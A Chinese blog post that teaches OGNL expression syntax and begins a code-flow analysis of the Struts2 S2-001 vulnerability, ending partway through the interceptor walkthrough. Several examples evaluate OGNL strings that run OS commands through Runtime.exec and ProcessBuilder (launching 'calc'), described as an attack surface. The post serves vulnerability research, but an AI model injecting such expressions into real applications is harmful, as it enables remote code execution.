<p>表达式是OGNL表达式中最为核心的部分，所有的OGNL操作都是针对表达式解析后进行的。通过表达式来告诉OGNL操作到底要干什么。因此表达式是一个<strong>带有语法意义的字符串</strong>，该字符串会规定操作的类型和内容。OGNL 表达式支持大量的表达式，如 “链式访问对象”、表达式计算、甚至还支持 Lambda 表达式。</p>
<ul>
<li>Root 对象</li>
</ul>
<p>OGNL 的 Root 对象可以理解为 OGNL 的操作对象。当我们指定了一个表达式的时候，我们需要指定这个表达式针对的是哪个具体的对象。而这个具体的对象就是 Root 对象，这就意味着，如果有一个 OGNL 表达式，那么我们需要针对 Root 对象来进行 OGNL 表达式的计算并且返回结果。</p>
<ul>
<li>上下文环境</li>
</ul>
<p>有个 Root 对象和表达式，我们就可以使用 OGNL 进行简单的操作了，如对 Root 对象的赋值与取值操作。但是，实际上在 OGNL 的内部，所有的操作都会在一个特定的数据环境中运行。这个数据环境就是上下文环境（Context）。OGNL 的上下文环境是一个 Map 结构，称之为 OgnlContext。Root 对象也会被添加到上下文环境当中去。</p>
<h4 id="QIcnf">OGNL基础使用</h4>
pom.xml文件导入

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;ognl&lt;/groupId&gt;</span><br><span class="line">	&lt;artifactId&gt;ognl&lt;/artifactId&gt;</span><br><span class="line">	&lt;version&gt;<span class="number">3.1</span><span class="number">.19</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>我们先来创建两个实体类</p>
<p>Address.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Address</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String port;</span><br><span class="line">    <span class="keyword">private</span> String address;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Address</span><span class="params">(String port,String address)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.port = port;</span><br><span class="line">        <span class="built_in">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPort</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> port;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPort</span><span class="params">(String port)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.port = port;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAddress</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAddress</span><span class="params">(String address)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>User.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> Address address;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Address <span class="title function_">getAddress</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAddress</span><span class="params">(Address address)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="OHdzZ">对ROOT对象的访问</h5>
OGNL使用一种链式风格进行对对象的访问

<p>链式编程，如其名是一条长长的链子，类似如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">StringBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line"><span class="comment">// 链式编程</span></span><br><span class="line">buffer.append(<span class="string">&quot;aaa&quot;</span>).append(<span class="string">&quot;bbb&quot;</span>).append(<span class="string">&quot;ccc&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>对应代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;sean&quot;</span>, <span class="number">20</span>);</span><br><span class="line">        <span class="type">Address</span> <span class="variable">address</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Address</span>(<span class="string">&quot;045000&quot;</span>, <span class="string">&quot;山西晋中&quot;</span>);</span><br><span class="line">        user.setAddress(address);</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;name&quot;</span>, user));   <span class="comment">// sean</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;name.length()&quot;</span>, user));     <span class="comment">// 4</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;address&quot;</span>, user).toString());    <span class="comment">// Address(port=045000, address=山西晋中)</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;address.port&quot;</span>, user));   <span class="comment">// 045000</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743413953947-619c8050-27cc-44e5-a2f7-45cdf4a4012a.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743413953947-619c8050-27cc-44e5-a2f7-45cdf4a4012a.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h5 id="DZvEL">对上下文对象的访问</h5>
使用OGNL的时候，若不设置上下文对象，系统就会自动创建一个上下文对象，如果传入的参数当中包含了上下文对象的参数，则会使用传入的上下文对象

<p>当我们访问上下文环境中的参数时，需要在表达式前面加<code>#</code>，表示了与访问根ROOT对象的区别</p>
<p>对应代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;sean&quot;</span>, <span class="number">20</span>);</span><br><span class="line">        <span class="type">Address</span> <span class="variable">address</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Address</span>(<span class="string">&quot;045000&quot;</span>, <span class="string">&quot;山西晋中&quot;</span>);</span><br><span class="line">        user.setAddress(address);</span><br><span class="line">        Map&lt;String, Object&gt; context = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">        context.put(<span class="string">&quot;init&quot;</span>, <span class="string">&quot;hello&quot;</span>);</span><br><span class="line">        context.put(<span class="string">&quot;user&quot;</span>, user);</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#init&quot;</span>, context, user));</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#user.name&quot;</span>, context, user));</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;age&quot;</span>, context, user));</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#user&quot;</span>, context, user));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743414317040-52b9c38e-17a8-44ab-9bd8-5edd3f543993.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743414317040-52b9c38e-17a8-44ab-9bd8-5edd3f543993.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h5 id="G3044">对静态变量与静态方法的访问</h5>

<p>同样的，OGNL也可以对静态变量和静态方法进行调用，格式如<code>\@[class]@[field/method ()]</code></p>
<p>对应代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        AtVisit();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">AtVisit</span><span class="params">()</span> <span class="keyword">throws</span> OgnlException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object1</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;@com.Static@ABC&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object2</span> <span class="operator">=</span> Ognl.getValue(<span class="string">&quot;@com.Static@exec(\&quot;calc\&quot;)&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        System.out.println(object1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>静态调用的类代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Static</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">ABC</span> <span class="operator">=</span> <span class="string">&quot;calc&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exec</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其中调用静态方法时的返回的object2，是基于静态方法的返回值，这里师傅们可以自行修改尝试</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743414846060-1e5b8688-714f-4518-b698-dbd8362f0680.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743414846060-1e5b8688-714f-4518-b698-dbd8362f0680.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h5 id="VcMvP">方法的调用</h5>
如果需要调用 Root 对象或者上下文对象当中的方法也可以使用 . 方法的方式来调用。甚至可以传入参数。就和正常的方法调用是一样的，在传参时也可以使用OGNL表达式来传入参数

<p>对应代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        Map&lt;String, Object&gt; context = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">        context.put(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;sean&quot;</span>);</span><br><span class="line">        context.put(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;getName()&quot;</span>, context, user)); <span class="comment">// null</span></span><br><span class="line">        Ognl.getValue(<span class="string">&quot;setName(#name)&quot;</span>, context, user);</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;getName()&quot;</span>, context, user)); <span class="comment">// sean</span></span><br><span class="line">        Ognl.getValue(<span class="string">&quot;setName(@com.Static@exec(\&quot;calc\&quot;))&quot;</span>, context, user);</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;getName()&quot;</span>, context, user)); <span class="comment">// exec</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743415413505-4b044844-1002-440a-8390-99167ac92663.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743415413505-4b044844-1002-440a-8390-99167ac92663.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h5 id="ISv3E">对数组和集合的访问</h5>
OGNL 支持对数组按照数组下标的顺序进行访问。此方式也适用于对集合的访问，对于 Map 支持使用键进行访问

<p>其中可以使用数字的加减，字符的拼接来访问，还有如下一些简单操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span> + <span class="number">4</span> <span class="comment">// 整数相加（同时也支持减法、乘法、除法、取余 [% /mod]、）</span></span><br><span class="line"><span class="string">&quot;hell&quot;</span> + <span class="string">&quot;lo&quot;</span> <span class="comment">// 字符串相加</span></span><br><span class="line">i++ <span class="comment">// 递增、递减</span></span><br><span class="line">i == j <span class="comment">// 判断</span></span><br><span class="line"><span class="keyword">var</span> in list <span class="comment">// 是否在容器当中</span></span><br></pre></td></tr></table></figure>

<p>对应代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        Map&lt;String, Object&gt; context = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">        String[] strings  = &#123;<span class="string">&quot;aa&quot;</span>, <span class="string">&quot;bb&quot;</span>&#125;;</span><br><span class="line">        ArrayList&lt;String&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;String&gt;();</span><br><span class="line">        list.add(<span class="string">&quot;aa&quot;</span>);</span><br><span class="line">        list.add(<span class="string">&quot;bb&quot;</span>);</span><br><span class="line">        Map&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, String&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;key1&quot;</span>, <span class="string">&quot;value1&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;key2&quot;</span>, <span class="string">&quot;value2&quot;</span>);</span><br><span class="line">        context.put(<span class="string">&quot;list&quot;</span>, list);</span><br><span class="line">        context.put(<span class="string">&quot;strings&quot;</span>, strings);</span><br><span class="line">        context.put(<span class="string">&quot;map&quot;</span>, map);</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#strings[0]&quot;</span>, context, user));   <span class="comment">// aa</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#list[0]&quot;</span>, context, user));  <span class="comment">// aa</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#list[0 + 1]&quot;</span>, context, user));  <span class="comment">// bb</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#map[&#x27;key1&#x27;]&quot;</span>, context, user));  <span class="comment">// value1</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#map[&#x27;key&#x27; + &#x27;2&#x27;]&quot;</span>, context, user));     <span class="comment">// value2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743415917014-5830d2ce-6920-4740-80a9-d81d812c4a34.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743415917014-5830d2ce-6920-4740-80a9-d81d812c4a34.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h5 id="GRoiG">投影与选择</h5>
OGNL 支持类似数据库当中的选择与投影功能

<ul>
<li><strong>投影：</strong></li>
</ul>
<p>选出集合当中相同属性组合成一个新的集合，语法为<code>collection.&#123;XXX&#125;</code>，其中XXX是该集合中每个元素的公共属性</p>
<ul>
<li><strong>选择：</strong></li>
</ul>
<p>选择就是选出集合中符合条件的元素组合成一个新的集合，语法为<code>collection.&#123;Y XXX&#125;</code>，其中Y是一个选择操作符，XXX是选择用的逻辑表达式</p>
<p>其中选择操作符有三种</p>
<ol>
<li>?：选择满足条件的所有元素</li>
<li>^：选择满足条件的第一个元素</li>
<li>$：选择满足条件的最后一个元素</li>
</ol>
<p>对应代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;name1&quot;</span>, <span class="number">11</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">p2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;name2&quot;</span>, <span class="number">22</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">p3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;name3&quot;</span>, <span class="number">33</span>);</span><br><span class="line">        <span class="type">User</span> <span class="variable">p4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;name4&quot;</span>, <span class="number">44</span>);</span><br><span class="line">        Map&lt;String, Object&gt; context = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line">        ArrayList&lt;User&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;User&gt;();</span><br><span class="line">        list.add(p1);</span><br><span class="line">        list.add(p2);</span><br><span class="line">        list.add(p3);</span><br><span class="line">        list.add(p4);</span><br><span class="line">        context.put(<span class="string">&quot;list&quot;</span>, list);</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#list.&#123;age&#125;&quot;</span>, context, list));</span><br><span class="line"><span class="comment">// [11, 22, 33, 44]</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#list.&#123;age + &#x27;-&#x27; + name&#125;&quot;</span>, context, list));</span><br><span class="line"><span class="comment">// [11-name1, 22-name2, 33-name3, 44-name4]</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#list.&#123;? #this.age &gt; 22&#125;&quot;</span>, context, list));</span><br><span class="line"><span class="comment">// [User(name=name3, age=33, address=null), User(name=name4, age=44, address=null)]</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#list.&#123;^ #this.age &gt; 22&#125;&quot;</span>, context, list));</span><br><span class="line"><span class="comment">// [User(name=name3, age=33, address=null)]</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#list.&#123;$ #this.age &gt; 22&#125;&quot;</span>, context, list));</span><br><span class="line"><span class="comment">// [User(name=name4, age=44, address=null)]</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743416558563-5643dad0-3c42-4d74-9e17-5ec548c5c1fa.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743416558563-5643dad0-3c42-4d74-9e17-5ec548c5c1fa.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h5 id="rl2c0">创建对象</h5>
OGNL支持直接使用表达式来创建对象，其中有三种情况

<ul>
<li>List对象：使用<code>&#123;&#125;</code>，中间使用<code>,</code>进行分割</li>
<li>Map对象：使用<code>#&#123;&#125;</code>，中间使用<code>,</code>进行分割键值对</li>
<li>任意对象：直接使用已知对象的构造方法进行构造</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;#&#123;&#x27;key1&#x27;:&#x27;value1&#x27;,&#x27;key2&#x27;:&#x27;value2&#x27;&#125;&quot;</span>, <span class="literal">null</span>)); <span class="comment">// &#123;key1=value1&#125;</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;&#123;&#x27;key1&#x27;,&#x27;value1&#x27;&#125;&quot;</span>, <span class="literal">null</span>));  <span class="comment">// [key1, value1]</span></span><br><span class="line">        System.out.println(Ognl.getValue(<span class="string">&quot;new pojo.User()&quot;</span>, <span class="literal">null</span>));</span><br><span class="line"><span class="comment">// User(name=null, age=0, address=null)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743416950403-6e977822-33e9-4594-a8cb-c28b5ef35528.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743416950403-6e977822-33e9-4594-a8cb-c28b5ef35528.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>这里可以直接创建任意对象，感觉就很有攻击面了，可以直接命令执行</p>
<p>代码如下，两者皆可执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilCalc</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> OgnlException &#123;  </span><br><span class="line">        Ognl.getValue(<span class="string">&quot;new java.lang.ProcessBuilder(new java.lang.String[]&#123;\&quot;calc\&quot;&#125;).start()&quot;</span>, <span class="literal">null</span>);  </span><br><span class="line"></span><br><span class="line">        Ognl.getValue(<span class="string">&quot;@java.lang.Runtime@getRuntime().exec(\&quot;calc\&quot;)&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743417080780-c2bdd739-a3ec-4342-9543-3f88616143f1.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743417080780-c2bdd739-a3ec-4342-9543-3f88616143f1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="WwGPD">S2-001</h2>
<h3 id="AHCsG">漏洞影响范围</h3>

<ul>
<li>WebWork 2.1 (with altSyntax enabled)</li>
<li>WebWork 2.2.0 - WebWork 2.2.5</li>
<li>Struts 2.0.0 - Struts 2.0.8</li>
</ul>
<p>而 Struts2 对 OGNL 表达式的解析使用了开源组件 opensymphony.xwork 2.0.3 所以会有漏洞</p>
<h3 id="IItvL">流程分析</h3>

<p>我们这里看到struts的<code>Filter</code>，<code>org.apache.struts2.dispatcher.FilterDispatcher</code>类的<code>doFilter</code>方法</p>
<p>在该方法中，它做了以下业务：</p>
<ul>
<li>设置编码和本地化信息</li>
<li>创建 ActionContext 对象</li>
<li>分配当前线程的分发器</li>
<li>将request对象进行封装</li>
<li>获取 ActionMapping 对象, ActionMapping 对象对应一个action详细配置信息</li>
<li>执行 Action 请求, 也就是 <code>serviceAction()</code>方法</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743486857729-0d588b21-c03e-4a0d-b43d-952c40642242.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743486857729-0d588b21-c03e-4a0d-b43d-952c40642242.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>在<code>doFilter</code>方法中下到断点，前面做了一些基础的数据转换和获取，最后我们跟进<code>serviceAction</code>方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743487680234-4a92ef29-b605-49cb-84de-19414a5e52f5.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743487680234-4a92ef29-b605-49cb-84de-19414a5e52f5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>首先获取当前请求是否已经有<code>ValueStack</code>对象，如果是接收到chain跳转方式的请求时，能够接管上次请求的请求和数据。</p>
<p>如果没有 ValueStack 对象，获取当前线程的ActionContext对象；如果有 ValueStack 对象，将事先处理好的请求中的参数 put 到 ValueStack 中</p>
<p>后续获取 ActionMapping 中配置的 namespace, name, method 值</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743487932957-581b5af6-a0ea-4619-a88e-066b73d942da.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743487932957-581b5af6-a0ea-4619-a88e-066b73d942da.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>这里通过<code>ActionProxyFactory</code>创建了<code>ActionProxy</code>对象，在这个过程中也会创建<code>StrutsActionProxy</code>的实例，<code>StrutsActionProxy</code>是继承自<code>com.opensymphony.xwork2.DefaultActionProxy</code>，实际在该代理对象的内部就持有了<code>DefaultActionInvocation</code>的实例，下一步就为Action代理对象设置执行的方法。</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743489041006-a5d29050-e6d7-4ce2-bc57-10cfc06d65e8.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743489041006-a5d29050-e6d7-4ce2-bc57-10cfc06d65e8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>继续跟进到<code>proxy.execute()</code>方法内，可以看到这里获取了上下文，并用setter方法赋值上下文</p>
<p>但这里只是对一些数据进行操作，具体的业务逻辑我们进入invoke方法中查看</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743489792863-b5031d72-c556-4217-bd1c-0c7fa1e34a66.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1743489792863-b5031d72-c556-4217-bd1c-0c7fa1e34a66.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>进入<code>invoke</code>方法后，在<code>interceptors.hasNext</code>判断中，使用迭代器进行顺序递归执行配置的所有拦截器，	所迭代的内容是Struts包中<code>default.xml</code>文件内配置的interceptors标签中的内容</p>
